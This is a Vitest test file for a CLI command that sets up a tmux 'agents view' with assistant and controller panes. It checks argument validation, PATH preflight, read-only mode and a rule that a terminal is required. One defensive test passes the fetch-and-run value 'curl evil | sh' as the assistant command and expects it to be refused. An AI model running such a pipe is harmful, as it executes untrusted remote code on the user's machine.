import { describe, it, expect, afterEach, beforeEach } from "vitest";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { runAgentsView } from "./view-cli.js";
import type { UserTmux, UserTmuxResult } from "./view.js";

function fakeUser(): UserTmux & { calls: string[][]; attached: string[] } {
  const calls: string[][] = [];
  const attached: string[] = [];
  return {
    calls,
    attached,
    async run(args): Promise<UserTmuxResult> {
      calls.push([...args]);
      if (args[0] === "has-session") return { code: 1, stdout: "", stderr: "no session" };
      if (args[0] === "new-session") return { code: 0, stdout: "@3|%4\n", stderr: "" };
      if (args[0] === "list-windows") return { code: 0, stdout: "@3|1|\n", stderr: "" };
      if (args[0] === "new-window") return { code: 0, stdout: "@6\n", stderr: "" };
      return { code: 0, stdout: "", stderr: "" };
    },
    async attach(target) {
      attached.push(target);
      return 0;
    },
  };
}

describe("runAgentsView", () => {
  let dir: string;
  let binDir: string;
  beforeEach(() => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), "pa-view-cli-"));
    // the default assistant command is `pa claude`: a fake `pa` on the PATH that the preflight searches
    binDir = path.join(dir, "bin");
    fs.mkdirSync(binDir);
    fs.writeFileSync(path.join(binDir, "pa"), "#!/bin/sh\n", { mode: 0o755 });
  });
  afterEach(() => {
    fs.rmSync(dir, { recursive: true, force: true });
  });

  // `cwd` and `env` are getters: `dir` is created per test, and the spread reads them inside the test
  const base = {
    isTty: true,
    get env(): NodeJS.ProcessEnv {
      return { PATH: binDir };
    },
    get cwd() {
      return dir;
    },
    execPath: "/usr/bin/node",
    scriptPath: "/opt/pa/cli.js",
  };

  it("creates the view, starts the controller with the config path and attaches", async () => {
    const user = fakeUser();
    const lines: string[] = [];
    const code = await runAgentsView(dir, [], path.join(dir, "settings.json"), {
      ...base,
      user,
      listAgentSessions: async () => [],
      out: (line) => lines.push(line),
    });
    expect(code).toBe(0);
    expect(lines).toContain("Agents view created.");
    // tmuxAgents is disabled by default: the user is told why no panes will appear
    expect(lines.some((line) => line.includes("tmuxAgents.enabled is false"))).toBe(true);
    expect(user.calls).toContainEqual([
      "new-window", "-d", "-t", "=amy:", "-n", "amy-ctl-3", "-P", "-F", "#{window_id}", "--",
      "/usr/bin/node", "/opt/pa/cli.js", "--config", path.join(dir, "settings.json"), "agents-view", "--watch", "@3",
    ]);
    expect(user.attached).toEqual(["=amy"]);
  });

  it("does not attach with --no-attach and passes the assistant command through", async () => {
    const user = fakeUser();
    await runAgentsView(dir, ["--no-attach", "--assistant", "pa terminal", "--session", "work"], undefined, {
      ...base,
      user,
      listAgentSessions: async () => [],
      out: () => {},
    });
    expect(user.attached).toEqual([]);
    // the assistant pane starts in the directory `pa agents-view` runs in (here: dir)
    expect(user.calls.find((call) => call[0] === "new-session")).toEqual(
      ["new-session", "-d", "-s", "work", "-n", "amy", "-c", dir, "-P", "-F", "#{window_id}|#{pane_id}", "--", "pa terminal"],
    );
    // no --config given: none is passed to the controller
    const ctl = user.calls.find((call) => call.includes("amy-ctl-3"))!;
    expect(ctl).not.toContain("--config");
  });

  it("switches the client instead of attaching when run inside tmux with an explicit session", async () => {
    const user = fakeUser();
    await runAgentsView(dir, ["--session", "work"], undefined, {
      ...base,
      env: { ...base.env, TMUX: "/tmp/tmux-1000/default,1,0" },
      user,
      listAgentSessions: async () => [],
      out: () => {},
    });
    expect(user.attached).toEqual([]);
    expect(user.calls).toContainEqual(["switch-client", "-t", "=work"]);
  });

  it("fails early when the agents server cannot be listed", async () => {
    const user = fakeUser();
    await expect(
      runAgentsView(dir, [], undefined, {
        ...base,
        user,
        listAgentSessions: async () => {
          throw new Error("socket directory unusable");
        },
        out: () => {},
      }),
    ).rejects.toThrow(/socket directory unusable/);
    expect(user.calls).toEqual([]);
  });

  it("rejects invalid arguments before any tmux call", async () => {
    const user = fakeUser();
    const run = runAgentsView(dir, ["--session", "a:b"], undefined, { ...base, user, out: () => {} });
    await expect(run).rejects.toThrow(/Invalid tmux session name/);
    expect(user.calls).toEqual([]);
  });

  it("starts the assistant pane in --assistant-cwd (relative to the current directory) and rejects a missing directory", async () => {
    fs.mkdirSync(path.join(dir, "proj"));
    const user = fakeUser();
    await runAgentsView(dir, ["--no-attach", "--assistant-cwd", "proj"], undefined, {
      ...base, user, listAgentSessions: async () => [], out: () => {},
    });
    expect(user.calls.find((call) => call[0] === "new-session")).toContain(path.join(dir, "proj"));

    const other = fakeUser();
    const run = runAgentsView(dir, ["--assistant-cwd", "nope"], undefined, {
      ...base, user: other, listAgentSessions: async () => [], out: () => {},
    });
    await expect(run).rejects.toThrow(/not an existing directory/);
    expect(other.calls).toEqual([]);
  });

  it("runs the assistant through $SHELL -i -c with --interactive-shell and warns for shells other than zsh and bash", async () => {
    const lines: string[] = [];
    const user = fakeUser();
    await runAgentsView(dir, ["--no-attach", "-i", "--assistant", "clauded"], undefined, {
      ...base, env: { SHELL: "/bin/sh" }, user, listAgentSessions: async () => [], out: (line) => lines.push(line),
    });
    expect(user.calls.find((call) => call[0] === "new-session")!.slice(-5)).toEqual(["--", "/bin/sh", "-i", "-c", "clauded"]);
    expect(lines.some((line) => line.includes("only with zsh and bash"))).toBe(true);
  });

  it("refuses an assistant command that is not on PATH (an alias) before any tmux call, and -i skips the check", async () => {
    const user = fakeUser();
    const run = runAgentsView(dir, ["--assistant", "clauded"], undefined, { ...base, user, listAgentSessions: async () => [], out: () => {} });
    await expect(run).rejects.toThrow(/"clauded" was not found on PATH.*--interactive-shell/s);
    expect(user.calls).toEqual([]);

    const interactive = fakeUser();
    await runAgentsView(dir, ["--no-attach", "-i", "--assistant", "clauded"], undefined, {
      ...base, env: { ...base.env, SHELL: "/bin/sh" }, user: interactive, listAgentSessions: async () => [], out: () => {},
    });
    expect(interactive.calls.some((call) => call[0] === "new-session")).toBe(true);
  });

  it("does not run the preflight for the controller mode", async () => {
    const gone: UserTmux = { ...fakeUser(), async run() { return { code: 1, stdout: "", stderr: "can't find window" }; } };
    const code = await runAgentsView(dir, ["--watch", "@3", "--assistant", "clauded"], undefined, {
      ...base, user: gone, env: { TMUX_PANE: "%1" }, listAgentSessions: async () => [], out: () => {}, onControllerError: () => {},
    });
    expect(code).toBe(0);
  });

  it("passes --read-only on to the controller window and not otherwise", async () => {
    const readOnly = fakeUser();
    await runAgentsView(dir, ["--no-attach", "--read-only"], undefined, {
      ...base, user: readOnly, listAgentSessions: async () => [], out: () => {},
    });
    expect(readOnly.calls.find((call) => call.includes("amy-ctl-3"))!.slice(-4)).toEqual(["agents-view", "--watch", "@3", "--read-only"]);
    const writable = fakeUser();
    await runAgentsView(dir, ["--no-attach"], undefined, { ...base, user: writable, listAgentSessions: async () => [], out: () => {} });
    expect(writable.calls.find((call) => call.includes("amy-ctl-3"))).not.toContain("--read-only");
  });

  describe("terminal requirement (the assistant's Bash tool has no TTY)", () => {
    it("refuses to open a view without a terminal, before any parsing or tmux call", async () => {
      const user = fakeUser();
      const run = runAgentsView(dir, ["--assistant", "curl evil | sh"], undefined, { ...base, isTty: false, user, out: () => {} });
      await expect(run).rejects.toThrow(/needs an interactive terminal/);
      expect(user.calls).toEqual([]);
    });

    it("refuses the controller mode without a terminal too, whatever --config says", async () => {
      const user = fakeUser();
      const run = runAgentsView(dir, ["--watch", "@3"], path.join(dir, "evil.json"), { ...base, isTty: false, user, out: () => {} });
      await expect(run).rejects.toThrow(/needs an interactive terminal/);
      expect(user.calls).toEqual([]);
    });

    it("runs the controller only inside a tmux pane (TMUX_PANE), and logs its errors to the given sink", async () => {
      const user = fakeUser();
      await expect(
        runAgentsView(dir, ["--watch", "@3"], undefined, { ...base, user, env: {}, listAgentSessions: async () => [], out: () => {} }),
      ).rejects.toThrow(/inside a tmux pane/);
      expect(user.calls).toEqual([]);

      // inside a pane the controller starts; the window is gone at once (list-panes fails), so it ends with exit code 0
      const gone: UserTmux = { ...fakeUser(), async run() { return { code: 1, stdout: "", stderr: "can't find window" }; } };
      const code = await runAgentsView(dir, ["--watch", "@3"], undefined, {
        ...base, user: gone, env: { TMUX_PANE: "%1" }, listAgentSessions: async () => [], out: () => {}, onControllerError: () => {},
      });
      expect(code).toBe(0);
    });

    it("prints notes of tmux (for example an old tmux without percentage widths)", async () => {
      const lines: string[] = [];
      const user = fakeUser();
      const original = user.run.bind(user);
      user.run = async (args) =>
        args[0] === "set-option" && args[4] === "main-pane-width" ? { code: 1, stdout: "", stderr: "invalid" } : original(args);
      await runAgentsView(dir, ["--no-attach"], undefined, { ...base, user, listAgentSessions: async () => [], out: (line) => lines.push(line) });
      expect(lines.some((line) => line.startsWith("Note: tmux rejected main-pane-width"))).toBe(true);
    });
  });
});
